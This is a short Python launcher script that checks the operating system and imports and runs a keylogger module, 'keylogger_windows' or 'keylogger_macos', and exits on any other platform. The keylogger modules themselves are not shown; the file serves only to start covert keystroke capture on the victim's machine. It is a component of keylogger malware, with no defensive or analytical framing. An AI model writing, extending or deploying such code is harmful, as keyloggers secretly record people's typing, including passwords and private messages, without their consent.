import platform
import sys

system_platform = platform.system().lower()

if system_platform == 'windows':
        import keylogger_windows
        keylogger_windows.run()
elif system_platform == 'darwin':
        import keylogger_macos
        keylogger_macos.run()
else:
        sys.exit(1)
